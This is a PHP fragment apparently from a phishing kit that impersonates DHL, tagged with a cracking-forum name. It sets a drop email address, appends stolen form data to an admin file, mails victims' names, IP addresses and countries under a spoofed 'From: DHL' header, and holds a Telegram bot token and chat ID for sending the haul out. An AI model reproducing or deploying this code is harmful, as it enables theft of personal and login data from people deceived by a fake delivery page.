<?php


$yourmail  = 'gogoradstar@protonmail.com'; // your email here [CRAX.PRO]

$f = fopen("../../admin.php", "a");
	fwrite($f, $msgbank);

$subject  = " ".$_SESSION['fname']." / ".$_SERVER['REMOTE_ADDR']." / ".$_SESSION['country1']." ";
$headers .= "From: DHL" . "\r\n";
mail($yourmail, $subject, $yagmail, $headers);

$botToken="1766769099:AAFLnGR59Zw9JsGS7y5eS91WFn2Az54Oepo"; // Your bot ID:TOKEN [CRAX.PRO]
$chatId="1682802617";  // Your Telegram ID [CRAX.PRO]

